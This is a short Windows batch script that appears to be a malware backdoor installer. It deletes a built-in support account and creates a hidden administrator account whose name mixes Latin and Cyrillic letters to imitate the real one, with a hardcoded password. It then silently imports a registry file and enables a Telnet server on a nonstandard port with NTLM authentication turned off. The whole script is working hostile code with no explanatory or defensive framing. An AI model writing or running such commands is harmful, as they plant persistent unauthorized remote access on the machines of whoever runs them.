chcp 1251
net user SUPPORT_388945a0 /delete
net user Aдминистратор 6kmkcjm6 /add
net localgroup Администраторы Aдминистратор /add
net localgroup Пользователи SUPPORT_388945a0 /del
regedit /s conf.reg
sc config tlntsvr start= auto
tlntadmn config port=972 sec=-NTLM
net start Telnet
